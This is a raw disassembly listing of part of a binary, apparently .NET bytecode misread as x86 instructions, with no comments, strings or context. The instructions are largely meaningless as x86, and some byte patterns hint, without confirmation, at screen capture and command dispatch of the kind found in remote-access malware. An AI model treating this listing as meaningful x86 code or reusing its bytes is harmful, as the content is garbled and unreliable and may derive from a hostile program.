  4036f6:	33 28                	xor    (%eax),%ebp
  4036f8:	28 04 00             	sub    %al,(%eax,%eax,1)
  4036fb:	00 06                	add    %al,(%esi)
  4036fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4036fe:	92                   	xchg   %eax,%edx
  4036ff:	00 00                	add    %al,(%eax)
  403701:	0a 6f 93             	or     -0x6d(%edi),%ch
  403704:	00 00                	add    %al,(%eax)
  403706:	0a 7e 28             	or     0x28(%esi),%bh
  403709:	00 00                	add    %al,(%eax)
  40370b:	04 6f                	add    $0x6f,%al
  40370d:	94                   	xchg   %eax,%esp
  40370e:	00 00                	add    %al,(%eax)
  403710:	0a 72 24             	or     0x24(%edx),%dh
  403713:	06                   	push   %es
  403714:	00 70 28             	add    %dh,0x28(%eax)
  403717:	31 00                	xor    %eax,(%eax)
  403719:	00 06                	add    %al,(%esi)
  40371b:	38 e8                	cmp    %ch,%al
  40371d:	01 00                	add    %eax,(%eax)
  40371f:	00 11                	add    %dl,(%ecx)
  403721:	13 72 46             	adc    0x46(%edx),%esi
  403724:	06                   	push   %es
  403725:	00 70 16             	add    %dh,0x16(%eax)
  403728:	28 4e 00             	sub    %cl,0x0(%esi)
  40372b:	00 0a                	add    %cl,(%edx)
  40372d:	16                   	push   %ss
  40372e:	33 4b 1b             	xor    0x1b(%ebx),%ecx
  403731:	8d 23                	lea    (%ebx),%esp
  403733:	00 00                	add    %al,(%eax)
  403735:	01 13                	add    %edx,(%ebx)
  403737:	14 11                	adc    $0x11,%al
  403739:	14 16                	adc    $0x16,%al
  40373b:	72 46                	jb     0x403783
  40373d:	06                   	push   %es
  40373e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403741:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403744:	7e 0a                	jle    0x403750
  403746:	00 00                	add    %al,(%eax)
  403748:	04 a2                	add    $0xa2,%al
  40374a:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  40374d:	28 61 00             	sub    %ah,0x0(%ecx)
  403750:	00 06                	add    %al,(%esi)
  403752:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403757:	0a 00                	or     (%eax),%al
  403759:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40375c:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  40375f:	7e 0f                	jle    0x403770
  403761:	00 00                	add    %al,(%eax)
  403763:	04 28                	add    $0x28,%al
  403765:	8f 00                	pop    (%eax)
  403767:	00 0a                	add    %cl,(%edx)
  403769:	a2 11 14 28 82       	mov    %al,0x82281411
  40376e:	00 00                	add    %al,(%eax)
  403770:	0a 28                	or     (%eax),%ch
  403772:	27                   	daa
  403773:	00 00                	add    %al,(%eax)
  403775:	06                   	push   %es
  403776:	38 8d 01 00 00 11    	cmp    %cl,0x11000001(%ebp)
  40377c:	13 72 5c             	adc    0x5c(%edx),%esi
  40377f:	06                   	push   %es
  403780:	00 70 16             	add    %dh,0x16(%eax)
  403783:	28 4e 00             	sub    %cl,0x0(%esi)
  403786:	00 0a                	add    %cl,(%edx)
  403788:	16                   	push   %ss
  403789:	40                   	inc    %eax
  40378a:	7a 01                	jp     0x40378d
  40378c:	00 00                	add    %al,(%eax)
  40378e:	7e 25                	jle    0x4037b5
  403790:	00 00                	add    %al,(%eax)
  403792:	04 2d                	add    $0x2d,%al
  403794:	0d 18 28 54 00       	or     $0x542818,%eax
  403799:	00 06                	add    %al,(%esi)
  40379b:	26 17                	es pop %ss
  40379d:	80 25 00 00 04 de 0c 	andb   $0xc,0xde040000
  4037a4:	28 23                	sub    %ah,(%ebx)
  4037a6:	00 00                	add    %al,(%eax)
  4037a8:	0a 28                	or     (%eax),%ch
  4037aa:	25 00 00 0a de       	and    $0xde0a0000,%eax
  4037af:	00 28                	add    %ch,(%eax)
  4037b1:	95                   	xchg   %eax,%ebp
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	0a 6f 96             	or     -0x6a(%edi),%ch
  4037b7:	00 00                	add    %al,(%eax)
  4037b9:	0a 13                	or     (%ebx),%dl
  4037bb:	0c 28                	or     $0x28,%al
  4037bd:	95                   	xchg   %eax,%ebp
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 6f 96             	or     -0x6a(%edi),%ch
  4037c3:	00 00                	add    %al,(%eax)
  4037c5:	0a 13                	or     (%ebx),%dl
  4037c7:	18 12                	sbb    %dl,(%edx)
  4037c9:	18 28                	sbb    %ch,(%eax)
  4037cb:	97                   	xchg   %eax,%edi
  4037cc:	00 00                	add    %al,(%eax)
  4037ce:	0a 12                	or     (%edx),%dl
  4037d0:	0c 28                	or     $0x28,%al
  4037d2:	98                   	cwtl
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 20                	or     (%eax),%ah
  4037d7:	05 10 02 00 73       	add    $0x73000210,%eax
  4037dc:	99                   	cltd
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 13                	or     (%ebx),%dl
  4037e1:	0e                   	push   %cs
  4037e2:	11 0e                	adc    %ecx,(%esi)
  4037e4:	28 9a 00 00 0a 13    	sub    %bl,0x130a0000(%edx)
  4037ea:	0a 12                	or     (%edx),%dl
  4037ec:	0b 11                	or     (%ecx),%edx
  4037ee:	0e                   	push   %cs
  4037ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f0:	9b                   	fwait
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	0a 11                	or     (%ecx),%dl
  4037f5:	0e                   	push   %cs
  4037f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f7:	9c                   	pushf
  4037f8:	00 00                	add    %al,(%eax)
  4037fa:	0a 28                	or     (%eax),%ch
  4037fc:	9d                   	popf
  4037fd:	00 00                	add    %al,(%eax)
  4037ff:	0a 11                	or     (%ecx),%dl
  403801:	0a 16                	or     (%esi),%dl
  403803:	16                   	push   %ss
  403804:	16                   	push   %ss
  403805:	16                   	push   %ss
  403806:	11 0b                	adc    %ecx,(%ebx)
  403808:	20 20                	and    %ah,(%eax)
  40380a:	00 cc                	add    %cl,%ah
  40380c:	00 6f 9e             	add    %ch,-0x62(%edi)
  40380f:	00 00                	add    %al,(%eax)
  403811:	0a 73 37             	or     0x37(%ebx),%dh
  403814:	00 00                	add    %al,(%eax)
  403816:	0a 13                	or     (%ebx),%dl
  403818:	0f 20 00             	mov    %cr0,%eax
  40381b:	01 00                	add    %eax,(%eax)
  40381d:	00 20                	add    %ah,(%eax)
  40381f:	9c                   	pushf
  403820:	00 00                	add    %al,(%eax)
  403822:	00 73 9f             	add    %dh,-0x61(%ebx)
  403825:	00 00                	add    %al,(%eax)
  403827:	0a 13                	or     (%ebx),%dl
  403829:	10 11                	adc    %dl,(%ecx)
  40382b:	10 28                	adc    %ch,(%eax)
  40382d:	9a 00 00 0a 13 0d 11 	lcall  $0x110d,$0x130a0000
  403834:	0d 11 0e 12 18       	or     $0x18120e11,%eax
  403839:	16                   	push   %ss
  40383a:	16                   	push   %ss
  40383b:	20 00                	and    %al,(%eax)
  40383d:	01 00                	add    %eax,(%eax)
  40383f:	00 20                	add    %ah,(%eax)
  403841:	9c                   	pushf
  403842:	00 00                	add    %al,(%eax)
  403844:	00 28                	add    %ch,(%eax)
  403846:	a0 00 00 0a 11       	mov    0x110a0000,%al
  40384b:	18 12                	sbb    %dl,(%edx)
  40384d:	17                   	pop    %ss
  40384e:	16                   	push   %ss
  40384f:	16                   	push   %ss
  403850:	11 0e                	adc    %ecx,(%esi)
  403852:	6f                   	outsl  %ds:(%esi),(%dx)
  403853:	9b                   	fwait
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 11                	or     (%ecx),%dl
  403858:	0e                   	push   %cs
  403859:	6f                   	outsl  %ds:(%esi),(%dx)
  40385a:	9c                   	pushf
  40385b:	00 00                	add    %al,(%eax)
  40385d:	0a 28                	or     (%eax),%ch
  40385f:	a0 00 00 0a 11       	mov    0x110a0000,%al
  403864:	17                   	pop    %ss
  403865:	18 6f a1             	sbb    %ch,-0x5f(%edi)
  403868:	00 00                	add    %al,(%eax)
  40386a:	0a 11                	or     (%ecx),%dl
  40386c:	10 11                	adc    %dl,(%ecx)
  40386e:	0f 28 a2 00 00 0a 6f 	movaps 0x6f0a0000(%edx),%xmm4
  403875:	a3 00 00 0a 1b       	mov    %eax,0x1b0a0000
  40387a:	8d 23                	lea    (%ebx),%esp
  40387c:	00 00                	add    %al,(%eax)
  40387e:	01 13                	add    %edx,(%ebx)
  403880:	14 11                	adc    $0x11,%al
  403882:	14 16                	adc    $0x16,%al
  403884:	72 66                	jb     0x4038ec
  403886:	06                   	push   %es
  403887:	00 70 a2             	add    %dh,-0x5e(%eax)
  40388a:	11 14 17             	adc    %edx,(%edi,%edx,1)
  40388d:	7e 0a                	jle    0x403899
  40388f:	00 00                	add    %al,(%eax)
  403891:	04 a2                	add    $0xa2,%al
  403893:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403896:	28 61 00             	sub    %ah,0x0(%ecx)
  403899:	00 06                	add    %al,(%esi)
  40389b:	a2 11 14 19 7e       	mov    %al,0x7e191411
  4038a0:	0a 00                	or     (%eax),%al
  4038a2:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4038a5:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  4038a8:	11 0f                	adc    %ecx,(%edi)
  4038aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4038ab:	6d                   	insl   (%dx),%es:(%edi)
  4038ac:	00 00                	add    %al,(%eax)
  4038ae:	0a 28                	or     (%eax),%ch
  4038b0:	66 00 00             	data16 add %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	28 a4 00 00 0a a2 11 	sub    %ah,0x11a20a00(%eax,%eax,1)
  4038bb:	14 28                	adc    $0x28,%al
  4038bd:	82 00 00             	addb   $0x0,(%eax)
  4038c0:	0a 28                	or     (%eax),%ch
  4038c2:	27                   	daa
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	06                   	push   %es
  4038c6:	11 0a                	adc    %ecx,(%edx)
  4038c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4038ca:	00 00                	add    %al,(%eax)
  4038cc:	0a 11                	or     (%ecx),%dl
  4038ce:	0f 6f 6f 00          	movq   0x0(%edi),%mm5
  4038d2:	00 0a                	add    %cl,(%edx)
  4038d4:	11 10                	adc    %edx,(%eax)
  4038d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4038d8:	00 00                	add    %al,(%eax)
  4038da:	0a 11                	or     (%ecx),%dl
  4038dc:	0d 6f a5 00 00       	or     $0xa56f,%eax
  4038e1:	0a 11                	or     (%ecx),%dl
  4038e3:	0e                   	push   %cs
  4038e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4038e6:	00 00                	add    %al,(%eax)
  4038e8:	0a de                	or     %dh,%bl
  4038ea:	0c 28                	or     $0x28,%al
  4038ec:	23 00                	and    (%eax),%eax
  4038ee:	00 0a                	add    %cl,(%edx)
  4038f0:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4038f6:	00 de                	add    %bl,%dh
  4038f8:	0f 25                	(bad)
  4038fa:	28 23                	sub    %ah,(%ebx)
  4038fc:	00 00                	add    %al,(%eax)
  4038fe:	0a 13                	or     (%ebx),%dl
  403900:	11 28                	adc    %ebp,(%eax)
  403902:	25 00 00 0a de       	and    $0xde0a0000,%eax
  403907:	00 de                	add    %bl,%dh
  403909:	1b 25 28 23 00 00    	sbb    0x2328,%esp
  40390f:	0a 13                	or     (%ebx),%dl
  403911:	12 11                	adc    (%ecx),%dl
  403913:	12 6f 91             	adc    -0x6f(%edi),%ch
  403916:	00 00                	add    %al,(%eax)
  403918:	0a 28                	or     (%eax),%ch
  40391a:	32 00                	xor    (%eax),%al
  40391c:	00 06                	add    %al,(%esi)
  40391e:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  403924:	00 2a                	add    %ch,(%edx)
  403926:	00 00                	add    %al,(%eax)
  403928:	41                   	inc    %ecx
  403929:	f4                   	hlt
  40392a:	00 00                	add    %al,(%eax)
  40392c:	00 00                	add    %al,(%eax)
  40392e:	00 00                	add    %al,(%eax)
  403930:	5b                   	pop    %ebx
  403931:	01 00                	add    %eax,(%eax)
  403933:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403936:	00 00                	add    %al,(%eax)
  403938:	77 01                	ja     0x40393b
  40393a:	00 00                	add    %al,(%eax)
  40393c:	0c 00                	or     $0x0,%al
  40393e:	00 00                	add    %al,(%eax)
  403940:	26 00 00             	add    %al,%es:(%eax)
  403943:	01 00                	add    %eax,(%eax)
  403945:	00 00                	add    %al,(%eax)
  403947:	00 8e 02 00 00 0c    	add    %cl,0xc000002(%esi)
  40394d:	00 00                	add    %al,(%eax)
  40394f:	00 9a 02 00 00 0e    	add    %bl,0xe000002(%edx)
  403955:	00 00                	add    %al,(%eax)
  403957:	00 26                	add    %ah,(%esi)
  403959:	00 00                	add    %al,(%eax)
  40395b:	01 00                	add    %eax,(%eax)
  40395d:	00 00                	add    %al,(%eax)
  40395f:	00 e0                	add    %ah,%al
  403961:	02 00                	add    (%eax),%al
  403963:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403966:	00 00                	add    %al,(%eax)
  403968:	ec                   	in     (%dx),%al
  403969:	02 00                	add    (%eax),%al
  40396b:	00 0f                	add    %cl,(%edi)
  40396d:	00 00                	add    %al,(%eax)
  40396f:	00 26                	add    %ah,(%esi)
  403971:	00 00                	add    %al,(%eax)
  403973:	01 00                	add    %eax,(%eax)
  403975:	00 00                	add    %al,(%eax)
  403977:	00 10                	add    %dl,(%eax)
  403979:	03 00                	add    (%eax),%eax
  40397b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40397e:	00 00                	add    %al,(%eax)
  403980:	1c 03                	sbb    $0x3,%al
  403982:	00 00                	add    %al,(%eax)
  403984:	0f 00 00             	sldt   (%eax)
  403987:	00 26                	add    %ah,(%esi)
  403989:	00 00                	add    %al,(%eax)
  40398b:	01 00                	add    %eax,(%eax)
  40398d:	00 00                	add    %al,(%eax)
  40398f:	00 63 03             	add    %ah,0x3(%ebx)
  403992:	00 00                	add    %al,(%eax)
  403994:	0c 00                	or     $0x0,%al
  403996:	00 00                	add    %al,(%eax)
  403998:	6f                   	outsl  %ds:(%esi),(%dx)
  403999:	03 00                	add    (%eax),%eax
  40399b:	00 0f                	add    %cl,(%edi)
  40399d:	00 00                	add    %al,(%eax)
  40399f:	00 26                	add    %ah,(%esi)
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	01 00                	add    %eax,(%eax)
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	00 3e                	add    %bh,(%esi)
  4039a9:	04 00                	add    $0x0,%al
  4039ab:	00 4e 00             	add    %cl,0x0(%esi)
  4039ae:	00 00                	add    %al,(%eax)
  4039b0:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4039b3:	00 52 00             	add    %dl,0x0(%edx)
  4039b6:	00 00                	add    %al,(%eax)
  4039b8:	26 00 00             	add    %al,%es:(%eax)
  4039bb:	01 00                	add    %eax,(%eax)
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	00 2e                	add    %ch,(%esi)
  4039c1:	06                   	push   %es
  4039c2:	00 00                	add    %al,(%eax)
  4039c4:	16                   	push   %ss
  4039c5:	00 00                	add    %al,(%eax)
  4039c7:	00 44 06 00          	add    %al,0x0(%esi,%eax,1)
  4039cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4039ce:	00 00                	add    %al,(%eax)
  4039d0:	26 00 00             	add    %al,%es:(%eax)
  4039d3:	01 00                	add    %eax,(%eax)
  4039d5:	00 00                	add    %al,(%eax)
  4039d7:	00 66 07             	add    %ah,0x7(%esi)
  4039da:	00 00                	add    %al,(%eax)
  4039dc:	25 00 00 00 8b       	and    $0x8b000000,%eax
  4039e1:	07                   	pop    %es
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0c 00                	or     $0x0,%al
  4039e6:	00 00                	add    %al,(%eax)
  4039e8:	26 00 00             	add    %al,%es:(%eax)
  4039eb:	01 00                	add    %eax,(%eax)
  4039ed:	00 00                	add    %al,(%eax)
  4039ef:	00 2e                	add    %ch,(%esi)
  4039f1:	06                   	push   %es
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	6b 01 00             	imul   $0x0,(%ecx),%eax
  4039f7:	00 99 07 00 00 0f    	add    %bl,0xf000007(%ecx)
  4039fd:	00 00                	add    %al,(%eax)
  4039ff:	00 26                	add    %ah,(%esi)
  403a01:	00 00                	add    %al,(%eax)
  403a03:	01 00                	add    %eax,(%eax)
  403a05:	00 00                	add    %al,(%eax)
  403a07:	00 00                	add    %al,(%eax)
  403a09:	00 00                	add    %al,(%eax)
  403a0b:	00 aa 07 00 00 aa    	add    %ch,-0x55fffff9(%edx)
  403a11:	07                   	pop    %es
  403a12:	00 00                	add    %al,(%eax)
  403a14:	1b 00                	sbb    (%eax),%eax
  403a16:	00 00                	add    %al,(%eax)
  403a18:	26 00 00             	add    %al,%es:(%eax)
  403a1b:	01 1b                	add    %ebx,(%ebx)
  403a1d:	30 0a                	xor    %cl,(%edx)
  403a1f:	00 b2 04 00 00 1e    	add    %dh,0x1e000004(%edx)
  403a25:	00 00                	add    %al,(%eax)
  403a27:	11 28                	adc    %ebp,(%eax)
  403a29:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a2a:	00 00                	add    %al,(%eax)
  403a2c:	0a 02                	or     (%edx),%al
  403a2e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a2f:	a8 00                	test   $0x0,%al
  403a31:	00 0a                	add    %cl,(%edx)
  403a33:	6f                   	outsl  %ds:(%esi),(%dx)
  403a34:	a9 00 00 0a 13       	test   $0x130a0000,%eax
  403a39:	05 16 13 04 38       	add    $0x38041316,%eax
  403a3e:	67 04 00             	addr16 add $0x0,%al
  403a41:	00 11                	add    %dl,(%ecx)
  403a43:	05 11 04 9a 0a       	add    $0xa9a0411,%eax
  403a48:	06                   	push   %es
  403a49:	6f                   	outsl  %ds:(%esi),(%dx)
  403a4a:	aa                   	stos   %al,%es:(%edi)
  403a4b:	00 00                	add    %al,(%eax)
  403a4d:	0a 72 70             	or     0x70(%edx),%dh
  403a50:	06                   	push   %es
  403a51:	00 70 16             	add    %dh,0x16(%eax)
  403a54:	28 4e 00             	sub    %cl,0x0(%esi)
  403a57:	00 0a                	add    %cl,(%edx)
  403a59:	16                   	push   %ss
  403a5a:	40                   	inc    %eax
  403a5b:	44                   	inc    %esp
  403a5c:	04 00                	add    $0x0,%al
  403a5e:	00 06                	add    %al,(%esi)
  403a60:	6f                   	outsl  %ds:(%esi),(%dx)
  403a61:	ab                   	stos   %eax,%es:(%edi)
  403a62:	00 00                	add    %al,(%eax)
  403a64:	0a 13                	or     (%ebx),%dl
  403a66:	07                   	pop    %es
  403a67:	16                   	push   %ss
  403a68:	13 06                	adc    (%esi),%eax
  403a6a:	38 29                	cmp    %ch,(%ecx)
  403a6c:	04 00                	add    $0x0,%al
  403a6e:	00 11                	add    %dl,(%ecx)
  403a70:	07                   	pop    %es
  403a71:	11 06                	adc    %eax,(%esi)
  403a73:	9a 0b 07 14 72 f8 02 	lcall  $0x2f8,$0x7214070b
  403a7a:	00 70 16             	add    %dh,0x16(%eax)
  403a7d:	8d 03                	lea    (%ebx),%eax
  403a7f:	00 00                	add    %al,(%eax)
  403a81:	01 14 14             	add    %edx,(%esp,%edx,1)
  403a84:	14 28                	adc    $0x28,%al
  403a86:	ac                   	lods   %ds:(%esi),%al
  403a87:	00 00                	add    %al,(%eax)
  403a89:	0a 72 7e             	or     0x7e(%edx),%dh
  403a8c:	06                   	push   %es
  403a8d:	00 70 16             	add    %dh,0x16(%eax)
  403a90:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  403a96:	65 07                	gs pop %es
  403a98:	14 72                	adc    $0x72,%al
  403a9a:	86 06                	xchg   %al,(%esi)
  403a9c:	00 70 18             	add    %dh,0x18(%eax)
  403a9f:	8d 03                	lea    (%ebx),%eax
  403aa1:	00 00                	add    %al,(%eax)
  403aa3:	01 13                	add    %edx,(%ebx)
  403aa5:	09 11                	or     %edx,(%ecx)
  403aa7:	09 16                	or     %edx,(%esi)
  403aa9:	14 a2                	adc    $0xa2,%al
  403aab:	11 09                	adc    %ecx,(%ecx)
  403aad:	17                   	pop    %ss
  403aae:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  403ab4:	13 08                	adc    (%eax),%ecx
  403ab6:	11 08                	adc    %ecx,(%eax)
  403ab8:	16                   	push   %ss
  403ab9:	7e 07                	jle    0x403ac2
  403abb:	00 00                	add    %al,(%eax)
  403abd:	04 a2                	add    $0xa2,%al
  403abf:	11 08                	adc    %ecx,(%eax)
  403ac1:	17                   	pop    %ss
  403ac2:	7e 08                	jle    0x403acc
  403ac4:	00 00                	add    %al,(%eax)
  403ac6:	04 a2                	add    $0xa2,%al
  403ac8:	11 08                	adc    %ecx,(%eax)
  403aca:	18 7e 0a             	sbb    %bh,0xa(%esi)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	04 a2                	add    $0xa2,%al
  403ad1:	11 08                	adc    %ecx,(%eax)
  403ad3:	19 7e 09             	sbb    %edi,0x9(%esi)
  403ad6:	00 00                	add    %al,(%eax)
  403ad8:	04 a2                	add    $0xa2,%al
  403ada:	11 08                	adc    %ecx,(%eax)
  403adc:	1a 28                	sbb    (%eax),%ch
  403ade:	61                   	popa
  403adf:	00 00                	add    %al,(%eax)
  403ae1:	06                   	push   %es
  403ae2:	a2 11 08 a2 11       	mov    %al,0x11a20811
  403ae7:	09 14 14             	or     %edx,(%esp,%edx,1)
  403aea:	14 17                	adc    $0x17,%al
  403aec:	28 75 00             	sub    %dh,0x0(%ebp)
  403aef:	00 0a                	add    %cl,(%edx)
  403af1:	26 dd e2             	es fucom %st(2)
  403af4:	03 00                	add    (%eax),%eax
  403af6:	00 38                	add    %bh,(%eax)
  403af8:	96                   	xchg   %eax,%esi
  403af9:	03 00                	add    (%eax),%eax
  403afb:	00 07                	add    %al,(%edi)
  403afd:	14 72                	adc    $0x72,%al
  403aff:	f8                   	clc
  403b00:	02 00                	add    (%eax),%al
  403b02:	70 16                	jo     0x403b1a
  403b04:	8d 03                	lea    (%ebx),%eax
  403b06:	00 00                	add    %al,(%eax)
  403b08:	01 14 14             	add    %edx,(%esp,%edx,1)
  403b0b:	14 28                	adc    $0x28,%al
  403b0d:	ac                   	lods   %ds:(%esi),%al
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	0a 72 94             	or     -0x6c(%edx),%dh
  403b13:	06                   	push   %es
  403b14:	00 70 16             	add    %dh,0x16(%eax)
  403b17:	28 ad 00 00 0a 39    	sub    %ch,0x390a0000(%ebp)
  403b1d:	9d                   	popf
  403b1e:	00 00                	add    %al,(%eax)
  403b20:	00 72 ac             	add    %dh,-0x54(%edx)
  403b23:	06                   	push   %es
  403b24:	00 70 7e             	add    %dh,0x7e(%eax)
  403b27:	0a 00                	or     (%eax),%al
  403b29:	00 04 28             	add    %al,(%eax,%ebp,1)
  403b2c:	1e                   	push   %ds
  403b2d:	00 00                	add    %al,(%eax)
  403b2f:	0a 28                	or     (%eax),%ch
  403b31:	61                   	popa
  403b32:	00 00                	add    %al,(%eax)
  403b34:	06                   	push   %es
  403b35:	28 1e                	sub    %bl,(%esi)
  403b37:	00 00                	add    %al,(%eax)
  403b39:	0a 7e 0a             	or     0xa(%esi),%bh
  403b3c:	00 00                	add    %al,(%eax)
  403b3e:	04 28                	add    $0x28,%al
  403b40:	1e                   	push   %ds
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 7e 1b             	or     0x1b(%esi),%bh
  403b46:	00 00                	add    %al,(%eax)
  403b48:	04 18                	add    $0x18,%al
  403b4a:	9a 28 ae 00 00 0a 28 	lcall  $0x280a,$0xae28
  403b51:	78 00                	js     0x403b53
  403b53:	00 0a                	add    %cl,(%edx)
  403b55:	28 1e                	sub    %bl,(%esi)
  403b57:	00 00                	add    %al,(%eax)
  403b59:	0a 7e 0a             	or     0xa(%esi),%bh
  403b5c:	00 00                	add    %al,(%eax)
  403b5e:	04 28                	add    $0x28,%al
  403b60:	1e                   	push   %ds
  403b61:	00 00                	add    %al,(%eax)
  403b63:	0a 07                	or     (%edi),%al
  403b65:	14 72                	adc    $0x72,%al
  403b67:	86 06                	xchg   %al,(%esi)
  403b69:	00 70 18             	add    %dh,0x18(%eax)
  403b6c:	8d 03                	lea    (%ebx),%eax
  403b6e:	00 00                	add    %al,(%eax)
  403b70:	01 13                	add    %edx,(%ebx)
  403b72:	08 11                	or     %dl,(%ecx)
  403b74:	08 16                	or     %dl,(%esi)
  403b76:	14 a2                	adc    $0xa2,%al
  403b78:	11 08                	adc    %ecx,(%eax)
  403b7a:	17                   	pop    %ss
  403b7b:	17                   	pop    %ss
  403b7c:	8d 03                	lea    (%ebx),%eax
  403b7e:	00 00                	add    %al,(%eax)
  403b80:	01 13                	add    %edx,(%ebx)
  403b82:	09 11                	or     %edx,(%ecx)
  403b84:	09 16                	or     %edx,(%esi)
  403b86:	7e 1b                	jle    0x403ba3
  403b88:	00 00                	add    %al,(%eax)
  403b8a:	04 18                	add    $0x18,%al
  403b8c:	9a 28 ae 00 00 0a 8c 	lcall  $0x8c0a,$0xae28
  403b93:	6f                   	outsl  %ds:(%esi),(%dx)
  403b94:	00 00                	add    %al,(%eax)
  403b96:	01 a2 11 09 a2 11    	add    %esp,0x11a20911(%edx)
  403b9c:	08 14 14             	or     %dl,(%esp,%edx,1)
  403b9f:	14 28                	adc    $0x28,%al
  403ba1:	ac                   	lods   %ds:(%esi),%al
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	0a 28                	or     (%eax),%ch
  403ba6:	63 00                	arpl   %eax,(%eax)
  403ba8:	00 0a                	add    %cl,(%edx)
  403baa:	28 22                	sub    %ah,(%edx)
  403bac:	00 00                	add    %al,(%eax)
  403bae:	0a 28                	or     (%eax),%ch
  403bb0:	27                   	daa
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	06                   	push   %es
  403bb4:	dd 20                	frstor (%eax)
  403bb6:	03 00                	add    (%eax),%eax
  403bb8:	00 38                	add    %bh,(%eax)
  403bba:	d4 02                	aam    $0x2
  403bbc:	00 00                	add    %al,(%eax)
  403bbe:	07                   	pop    %es
  403bbf:	14 72                	adc    $0x72,%al
  403bc1:	f8                   	clc
  403bc2:	02 00                	add    (%eax),%al
  403bc4:	70 16                	jo     0x403bdc
  403bc6:	8d 03                	lea    (%ebx),%eax
  403bc8:	00 00                	add    %al,(%eax)
  403bca:	01 14 14             	add    %edx,(%esp,%edx,1)
  403bcd:	14 28                	adc    $0x28,%al
  403bcf:	ac                   	lods   %ds:(%esi),%al
  403bd0:	00 00                	add    %al,(%eax)
  403bd2:	0a 72 be             	or     -0x42(%edx),%dh
  403bd5:	06                   	push   %es
  403bd6:	00 70 16             	add    %dh,0x16(%eax)
  403bd9:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  403bdf:	62 07                	bound  %eax,(%edi)
  403be1:	14 72                	adc    $0x72,%al
  403be3:	86 06                	xchg   %al,(%esi)
  403be5:	00 70 18             	add    %dh,0x18(%eax)
  403be8:	8d 03                	lea    (%ebx),%eax
  403bea:	00 00                	add    %al,(%eax)
  403bec:	01 13                	add    %edx,(%ebx)
  403bee:	08 11                	or     %dl,(%ecx)
  403bf0:	08 16                	or     %dl,(%esi)
  403bf2:	14 a2                	adc    $0xa2,%al
  403bf4:	11 08                	adc    %ecx,(%eax)
  403bf6:	17                   	pop    %ss
  403bf7:	17                   	pop    %ss
  403bf8:	8d 03                	lea    (%ebx),%eax
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	01 13                	add    %edx,(%ebx)
  403bfe:	09 11                	or     %edx,(%ecx)
  403c00:	09 16                	or     %edx,(%esi)
  403c02:	7e 1b                	jle    0x403c1f
  403c04:	00 00                	add    %al,(%eax)
  403c06:	04 18                	add    $0x18,%al
  403c08:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  403c0f:	14 14                	adc    $0x14,%al
  403c11:	14 28                	adc    $0x28,%al
  403c13:	ac                   	lods   %ds:(%esi),%al
  403c14:	00 00                	add    %al,(%eax)
  403c16:	0a 28                	or     (%eax),%ch
  403c18:	22 00                	and    (%eax),%al
  403c1a:	00 0a                	add    %cl,(%edx)
  403c1c:	0c 08                	or     $0x8,%al
  403c1e:	72 0e                	jb     0x403c2e
  403c20:	02 00                	add    (%eax),%al
  403c22:	70 6f                	jo     0x403c93
  403c24:	af                   	scas   %es:(%edi),%eax
  403c25:	00 00                	add    %al,(%eax)
  403c27:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  403c2a:	08 28                	or     %ch,(%eax)
  403c2c:	32 00                	xor    (%eax),%al
  403c2e:	00 06                	add    %al,(%esi)
  403c30:	2b 06                	sub    (%esi),%eax
  403c32:	08 28                	or     %ch,(%eax)
  403c34:	31 00                	xor    %eax,(%eax)
  403c36:	00 06                	add    %al,(%esi)
  403c38:	dd 9c 02 00 00 38 50 	fstpl  0x50380000(%edx,%eax,1)
  403c3f:	02 00                	add    (%eax),%al
  403c41:	00 07                	add    %al,(%edi)
  403c43:	14 72                	adc    $0x72,%al
  403c45:	f8                   	clc
  403c46:	02 00                	add    (%eax),%al
  403c48:	70 16                	jo     0x403c60
  403c4a:	8d 03                	lea    (%ebx),%eax
